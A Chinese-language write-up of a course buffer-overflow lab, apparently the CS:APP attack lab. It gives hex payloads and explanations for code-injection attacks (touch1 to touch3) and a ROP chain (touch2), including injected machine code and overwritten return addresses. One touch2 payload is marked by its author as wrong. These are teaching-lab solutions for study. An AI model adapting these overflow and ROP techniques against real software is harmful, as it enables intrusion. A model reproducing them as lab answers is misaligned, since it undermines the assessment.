代码注入攻击
touch1
00 00 00 00 00 00 00 00  /* 0x5561dc78 */
00 00 00 00 00 00 00 00  /* 0x5561dc80 */
00 00 00 00 00 00 00 00  /* 0x5561dc88 */
00 00 00 00 00 00 00 00  /* 0x5561dc90 */
00 00 00 00 00 00 00 00  /* 0x5561dc98 */
c0 17 40 00 00 00 00 00  /* 0x5561dca8 */
栈空间有40个字节 后面的8个字节就是返回地址 修改其返回地址就可以修改程序运行顺序
touch2
错误答案 有点小问题会导致段错误
00 00 00 00 00 00 00 00  /* 0x5561dc78 */ 
00 00 00 00 00 00 00 00  /* 0x5561dc80 */
00 00 00 00 00 00 00 00  /* 0x5561dc88 */
00 00 00 00 00 00 00 00  /* 0x5561dc90 */
48 c7 c7 fa 97 b9 59 c3  /* 0x5561dc98 执行完mov $0x59b997fa, %rdi ret 第二次ret rip=0x00000000004017ec*/
98 dc 61 55 00 00 00 00  /* 0x5561dca0 第一次ret rip=0x5561dc98*/
ec 17 40 00 00 00 00 00  /* 0x5561dca8 */
栈空间是40字节 后面的8个字节就是返回地址这8个字节的值是98 dc 61 55 00 00 00 00 所以我们使程序运行到了地址0x5561dc98处 这里有我植入的代码
即mov $0x59b997fa, %rdi的字节序48 c7 c7 fa 97 b9 59 再接一个ret指令的字节序c3 
所以植入的代码为：
mov $0x59b997fa, %rdi
ret
对应的字节序为：48 c7 c7 fa 97 b9 59 c3
接一个ret指令是再次修改程序执行的指令 使其执行touch2的代码 mov $0x59b997fa, %rdi这个指令为touch2函数传递参数
正确答案
00 00 00 00 00 00 00 00  /* 0x5561dc78 */ 
00 00 00 00 00 00 00 00  /* 0x5561dc80 */
00 00 00 00 00 00 00 00  /* 0x5561dc88 */
00 00 00 68 ec 17 40 00  /* 0x5561dc90 */
48 c7 c7 fa 97 b9 59 c3  /* 0x5561dc98 执行完 pushq  $0x4017ec mov $0x59b997fa, %rdi ret */
93 dc 61 55 00 00 00 00  /* 0x5561dca0 第一次ret rip=0x5561dc93 */
/* ec 17 40 00 00 00 00 00  0x5561dca8 */
栈空间是40字节 后面的8个字节就是返回地址这8个字节的值是93 dc 61 55 00 00 00 00 所以我们使程序运行到了地址0x5561dc93处 这里有我植入的代码 
植入的代码为：
pushq  $0x4017ec
mov $0x59b997fa, %rdi
ret
对应的字节序为：68 ec 17 40 00 48 c7 c7 fa 97 b9 59 c3
pushq指令将0x5561dca0地址处的内容修改为$0x4017ec，即touch2代码开始的地方
再执行mov $0x59b997fa, %rdi和ret指令，传递参数和修改程序执行的顺序 使其跳转到touch2的代码处

touch3
00 00 00 00 00 00 00 00  /* 0x5561dc78 */ 
35 39 62 39 39 37 66 61  /* 0x5561dc80 */
00 00 00 00 00 00 00 00  /* 0x5561dc88 */
00 00 00 68 fa 18 40 00  /* 0x5561dc90 */
48 c7 c7 a8 dc 61 55 c3  /* 0x5561dc98 执行完push $0x4018fa mov $0x59b997fa, %rdi ret */
93 dc 61 55 00 00 00 00  /* 0x5561dca0 第一次ret rip=0x5561dc93 */
35 39 62 39 39 37 66 61  /* 0x5561dca8 */
00 00 00 00 00 00 00 00  /* 0x5561dcb0 */
栈空间是40字节 后面的8个字节就是返回地址这8个字节的值是93 dc 61 55 00 00 00 00 所以我们使程序运行到了地址0x5561dc93处 这里有我植入的代码 
植入的代码为：
pushq  $0x4018fa
mov $0x5561dca8, %rdi
ret
对应的字节序为：68 fa 18 40 00 48 c7 c7 a8 dc 61 55 c3
pushq指令将0x5561dca0地址处的内容修改为$0x4018fa，即touch3代码开始的地方
再执行mov $0x5561dca8, %rdi和ret指令，传递参数和修改程序执行的顺序 使其跳转到touch3的代码处
地址0x5561dca8处存取着字符串“59b997fa” 存在在rsp的下面就不会被覆盖掉

rop攻击（面向返回编程攻击）
touch2
00 00 00 00 00 00 00 00  /* 0x5561dc78 */ 
00 00 00 00 00 00 00 00  /* 0x5561dc80 */
00 00 00 00 00 00 00 00  /* 0x5561dc88 */
00 00 00 00 00 00 00 00  /* 0x5561dc90 */
00 00 00 00 00 00 00 00  /* 0x5561dc98 */
ab 19 40 00 00 00 00 00  /* 0x5561dca0 */
fa 97 b9 59 00 00 00 00  /* 0x5561dca8 */
a2 19 40 00 00 00 00 00  /* 0x5561dcb0 */
ec 17 40 00 00 00 00 00  /* 0x5561dcb8 */
栈空间是40字节 后面的8个字节就是返回地址这8个字节的值是ab 19 40 00 00 00 00 00 所以我们使程序运行到了地址0x4019ab处
对应指令的字节序是58 90 c3对应的指令就是
popq %rax
nop
retq
将0x59b997fa从栈顶弹出到rax中之后再ret 将a2 19 40 00 00 00 00 00放入rip中 修改程序执行顺序
即运行到0x4019a2处 对应指令的字节序是48 89 c7 c3对应的指令就是
mov %rax，%rdi
retq
将rax里的值放入rdi，即将0x59b997fa放入rdi，作为touch2函数传入的参数 再ret
将ec 17 40 00 00 00 00 00放入rip中 是程序运行到0x4017ec处即touch2函数